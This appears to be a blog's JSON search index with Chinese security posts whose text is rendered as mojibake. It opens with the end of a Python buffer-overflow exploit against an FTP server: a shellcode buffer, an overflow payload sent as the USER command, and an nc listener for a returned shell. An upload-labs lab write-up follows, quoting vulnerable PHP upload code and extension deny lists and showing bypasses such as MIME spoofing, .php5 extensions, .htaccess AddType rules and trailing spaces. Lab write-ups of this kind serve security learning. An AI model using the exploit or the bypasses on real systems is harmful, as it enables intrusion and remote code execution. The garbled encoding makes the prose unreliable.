&quot;\\xa8\\xd9\\xd9\\xe3\\xb2\\x3e\\xe7\\xba\\x49\\xf4\\x93\\x3c\\x9b&quot;buf += &quot;\\xc4\\x5c\\x92\\xe2\\xe8\\xae\\xea\\x23\\xce\\x50\\x99\\x5d\\x2c&quot;buf += &quot;\\xec\\x9a\\x9a\\x4e\\x2a\\x2e\\x38\\xe8\\xb9\\x88\\xe4\\x08\\x6d&quot;buf += &quot;\\x4e\\x6f\\x06\\xda\\x04\\x37\\x0b\\xdd\\xc9\\x4c\\x37\\x56\\xec&quot;buf += &quot;\\x82\\xb1\\x2c\\xcb\\x06\\x99\\xf7\\x72\\x1f\\x47\\x59\\x8a\\x7f&quot;buf += &quot;\\x28\\x06\\x2e\\xf4\\xc5\\x53\\x43\\x57\\x82\\x90\\x6e\\x67\\x52&quot;buf += &quot;\\xbf\\xf9\\x14\\x60\\x60\\x52\\xb2\\xc8\\xe9\\x7c\\x45\\x2e\\xc0&quot;buf += &quot;\\x39\\xd9\\xd1\\xeb\\x39\\xf0\\x15\\xbf\\x69\\x6a\\xbf\\xc0\\xe1&quot;buf += &quot;\\x6a\\x40\\x15\\xa5\\x3a\\xee\\xc6\\x06\\xea\\x4e\\xb7\\xee\\xe0&quot;buf += &quot;\\x40\\xe8\\x0f\\x0b\\x8b\\x81\\xba\\xf6\\x5c\\x02\\x2a\\xf2\\x13&quot;buf += &quot;\\x32\\x49\\x02\\x28\\x11\\xc4\\xe4\\x5a\\x85\\x81\\xbf\\xf2\\x3c&quot;buf += &quot;\\x88\\x4b\\x62\\xc0\\x06\\x36\\xa4\\x4a\\xa5\\xc7\\x6b\\xbb\\xc0&quot;buf += &quot;\\xdb\\x1c\\x4b\\x9f\\x81\\x8b\\x54\\x35\\xad\\x50\\xc6\\xd2\\x2d&quot;buf += &quot;\\x1e\\xfb\\x4c\\x7a\\x77\\xcd\\x84\\xee\\x65\\x74\\x3f\\x0c\\x74&quot;buf += &quot;\\xe0\\x78\\x94\\xa3\\xd1\\x87\\x15\\x21\\x6d\\xac\\x05\\xff\\x6e&quot;buf += &quot;\\xe8\\x71\\xaf\\x38\\xa6\\x2f\\x09\\x93\\x08\\x99\\xc3\\x48\\xc3&quot;buf += &quot;\\x4d\\x95\\xa2\\xd4\\x0b\\x9a\\xee\\xa2\\xf3\\x2b\\x47\\xf3\\x0c&quot;buf += &quot;\\x83\\x0f\\xf3\\x75\\xf9\\xaf\\xfc\\xac\\xb9\\xd0\\x1e\\x64\\xb4&quot;buf += &quot;\\x78\\x87\\xed\\x75\\xe5\\x38\\xd8\\xba\\x10\\xbb\\xe8\\x42\\xe7&quot;buf += &quot;\\xa3\\x99\\x47\\xa3\\x63\\x72\\x3a\\xbc\\x01\\x74\\xe9\\xbd\\x03&quot;payload = &quot;A&quot; * 2001 + &quot;\\x7b\\x46\\x86\\x7c&quot; + &quot;\\x90&quot; * 30 + bufhost = sys.argv[1] # receive IPport = int(sys.argv[2]) # receive ports = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, port))s.send(&quot;USER &quot; + payload)s.recv(1024)s.send(&quot;PASS Tao&quot;)s.recv(1024) kali2.0 ä½¿ç”¨nc -lp 1234 ç›‘å¬1234ç«¯å£ï¼Œç„¶åæ‰§è¡Œ./exp.py 172.16.10.156 21 æˆåŠŸï¼ å‚è€ƒæ–‡ç« ï¼šhttp://www.legendsec.org/2020.htmlï¼Œ https://www.anquanke.com/post/id/84893","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æº¢å‡ºæ”»å‡»","slug":"æº¢å‡ºæ”»å‡»","permalink":"https://bobtaoy.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"}]},{"title":"upload-labsç¬”è®°","slug":"upload-labsç¬”è®°","date":"2020-11-03T14:54:50.000Z","updated":"2020-11-04T07:07:20.420Z","comments":true,"path":"2020/11/03/upload-labsç¬”è®°/","link":"","permalink":"https://bobtaoy.github.io/2020/11/03/upload-labs%E7%AC%94%E8%AE%B0/","excerpt":"","text":"upload-labs è¯´æ˜ï¼šåšé¢˜å‰å…ˆæ¸…ç©ºä¹‹å‰å…³å¡ä¸Šä¼ çš„æ–‡ä»¶ Pass-01 jsæ£€æŸ¥1. åˆ†æé¦–å…ˆæˆ‘ä»¬å…ˆä¸Šä¼ ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡ï¼Œç¡®å®šä¸Šä¼ åæ–‡ä»¶ä¿å­˜çš„è·¯åŠ² ä¸Šä¼ è·¯åŠ²ä¸º../upload/, ä¹Ÿå°±æ˜¯http://ip/upload/tao.jpg æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°åŸºäºå‰ç«¯jsçš„æ£€æŸ¥ï¼Œåªæ£€æŸ¥äº†æ–‡ä»¶ä¸Šä¼ çš„åç¼€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŸºäºå‰ç«¯æ§åˆ¶å°ï¼Œå°±è¯¥å³å¯ç»•è¿‡ 123456789101112131415161718// Pass-01function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; &#125; &#125; 2. åˆ©ç”¨æˆ‘ä»¬å°†ä¸Šè¿°ä»£ç å…è®¸ä¿®æ”¹æˆ.php, ç„¶åå¤åˆ¶ä»£ç åœ¨concoleæ‰§è¡Œï¼Œ æ‰§è¡Œå¦‚ä¸‹å›¾ï¼š ç„¶åæˆ‘ä»¬ä¸Šä¼ phpæ–‡ä»¶ Pass-02 MIMEç±»å‹æ£€æŸ¥1. åˆ†ææŸ¥çœ‹æºä»£ç ï¼š 1234567891011121314151617181920# Pass-02$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ä¸Šé¢ä»£ç ç¬¬5è¡Œåªå¯¹æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œäº†æ£€æŸ¥ï¼ŒåŠåªå¯¹httpåŒ…å¤´Content-typeå­—æ®µè¿›è¡Œäº†æ ¡éªŒ å¸¸è§MIMEç±»å‹ ç±»å‹ æè¿° å…¸å‹ç¤ºä¾‹ text è¡¨æ˜æ–‡ä»¶æ˜¯æ™®é€šæ–‡æœ¬ï¼Œç†è®ºä¸Šæ˜¯äººç±»å¯è¯» text/plain, text/html, text/css, text/javascript image è¡¨æ˜æ˜¯æŸç§å›¾åƒã€‚ä¸åŒ…æ‹¬è§†é¢‘ï¼Œä½†æ˜¯åŠ¨æ€å›¾ï¼ˆæ¯”å¦‚åŠ¨æ€gifï¼‰ä¹Ÿä½¿ç”¨imageç±»å‹ image/gif, image/png, image/jpeg, image/bmp, image/webp, image/x-icon, image/vnd.microsoft.icon audio è¡¨æ˜æ˜¯æŸç§éŸ³é¢‘æ–‡ä»¶ audio/midi, audio/mpeg, audio/webm, audio/ogg, audio/wav video è¡¨æ˜æ˜¯æŸç§è§†é¢‘æ–‡ä»¶ video/webm, video/ogg application è¡¨æ˜æ˜¯æŸç§äºŒè¿›åˆ¶æ•°æ® application/octet-stream, application/pkcs12, application/vnd.mspowerpoint, application/xhtml+xml, application/xml, application/pdf 2. åˆ©ç”¨å› ä¸ºä»£ç åªå¯¹Content-typeå­—æ®µè¿›è¡Œäº†æ ¡éªŒï¼Œ æˆ‘ä»¬ä½¿ç”¨burpä¿®æ”¹ç¬¦å·çš„ç±»å‹å³å¯ç»•è¿‡ Pass-03 é»‘åå•ç»•è¿‡1. åˆ†æ12345678910111213141516171819202122232425262728# Pass-03$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; trim() å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ è¯­æ³•ï¼štrim(string,charlist) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚ charlist å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœè¢«çœç•¥ï¼Œåˆ™ç§»é™¤ä»¥ä¸‹æ‰€æœ‰å­—ç¬¦ï¼šâ€œ\\0â€ - NULLâ€\\tâ€ - åˆ¶è¡¨ç¬¦â€\\nâ€ - æ¢è¡Œâ€\\x0Bâ€ - å‚ç›´åˆ¶è¡¨ç¬¦â€\\râ€ - å›è½¦â€ â€œ - ç©ºæ ¼ deldot(file_name); //åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ 123456789101112function deldot($s)&#123; for($i = strlen($s)-1;$i&gt;0;$i--)&#123; $c = substr($s,$i,1); if($i == strlen($s)-1 and $c != &#x27;.&#x27;)&#123; return $s; &#125; if($c != &#x27;.&#x27;)&#123; return substr($s,0,$i+1); &#125; &#125;&#125; strrchr() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ è¯­æ³•ï¼šstrrchr(string,char) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚ char å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚å¦‚æœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…æ­¤æ•°å­—çš„ ASCII å€¼çš„å­—ç¬¦ã€‚ è¿”å›å€¼ è¿”å›ä»æŸä¸ªå­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®åˆ°ä¸»å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ã€‚ strtolower() å‡½æ•°æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ str_ireplace() å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚ è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚ å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚ å¦‚æœåŒæ—¶éœ€è¦å¯¹æ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œæ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†åªå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨ è¯­æ³•ï¼šstr_ireplace(find,replace,string,count) å‚æ•° æè¿° find å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚ replace å¿…éœ€ã€‚è§„å®šæ›¿æ¢ find ä¸­çš„å€¼çš„å€¼ã€‚ string å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ count å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚ ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥ä¸Šä¼ å…¶ä»–ä»»æ„åç¼€ ä½†æ˜¯å¯ä»¥ä¸Šä¼ å…¶ä»–ä»»æ„åç¼€ 1.php .phtml .phps .php5 .pht å‰ææ˜¯apacheçš„httpd.confä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç  1AddType application/x-httpd-php .php .phtml .phps .php5 .pht æˆ–è€…ä¸Šä¼ .htaccessæ–‡ä»¶,éœ€è¦ï¼š mod_rewriteæ¨¡å—å¼€å¯ AllowOverride All æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š &lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 1234567 - æ­¤æ—¶ä¸Šä¼ &#96;shell.jpg&#96;æ–‡ä»¶å³å¯è¢«å½“ä½œphpæ¥è§£ææˆ–è€…&#96;&#96;&#96;phpAddType application&#x2F;x-httpd-php .jpg æ‰€æœ‰.jpgæ–‡ä»¶ä¼šè¢«è§£ææˆphpæ–‡ä»¶ è¿™é‡Œç¬¬15è¡Œä»£ç ï¼Œä¼šç»™æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œå¯¼è‡´ä¸Šä¼ çš„.htaccessä¼šå˜æˆæ•°å­—.htaccess æˆ‘ä»¬ç”¨ç¬¬ä¸€ç§æ–¹æ³• 2. åˆ©ç”¨ä¸Šä¼ åç¼€ä¸º.php5 Pass-04 .htaccessç»•è¿‡1. åˆ†æ12345678910111213141516171819202122232425262728# Pass-04$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; è¿‡æ»¤äº†å„ç§ç½•è§åç¼€ 1$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤.htaccess,ä¸Šè¿°ä»£ç è·Ÿç¬¬ä¸‰é¢˜ç±»ä¼¼,ä»£ç åˆ†æå‚çœ‹Pass-03 2. åˆ©ç”¨ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 1AddType application/x-httpd-php .jpg å°†åç¼€.jpgçš„æ–‡ä»¶è§£é‡Šä¸ºphpå¯æ‰§è¡Œæ–‡ä»¶ ç„¶åä¸Šä¼ phpinfo.jpg, å†…å®¹å¦‚ä¸‹ï¼š 123&lt;?php phpinfo();?&gt; Pass-05 å¤§å°å†™ç»•è¿‡1. åˆ†æ123456789101112131415161718192021222324252627# Pass-05$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç¦ç”¨äº†ç½•è§çš„ä¸€äº›åç¼€ï¼Œä»¥åŠ.htaccess, ä½†æ˜¯å¹¶æ²¡æœ‰å°†åç¼€è½¬æ¢æˆå°å†™ï¼Œè¿™é‡Œæ²¡æœ‰strtolower()å‡½æ•°è¿›è¡Œåç¼€å¤„ç†ï¼Œè€Œç¦ç”¨çš„åç¼€å¹¶æ²¡æœ‰åŒ…æ‹¬Phpåç¼€ æ³¨æ„ï¼šåœ¨Linuxæ²¡æœ‰ç‰¹æ®Šé…ç½®çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æƒ…å†µåªæœ‰winå¯ä»¥ï¼Œå› ä¸ºwinä¼šå¿½ç•¥å¤§å°å†™ 2. åˆ©ç”¨ Pass-06 ç©ºæ ¼ç»•è¿‡1. ä»£ç åˆ†æ123456789101112131415161718192021222324252627# Pass-06$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; åœ¨Winä¸‹xx.jpg[ç©ºæ ¼] æˆ–xx.jpg.è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª.phpç©ºæ ¼æ–‡ä»¶å³å¯ .phpç©ºæ ¼ç»•è¿‡äº†$deny_extçš„éªŒè¯ï¼Œå¯¼è‡´äº†æ–‡ä»¶ä¸Šä¼  2. åˆ©ç”¨ Pass-07 .ç»•è¿‡1.åˆ†æ123456789101112131415161718192021222324252627# Pass-07$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 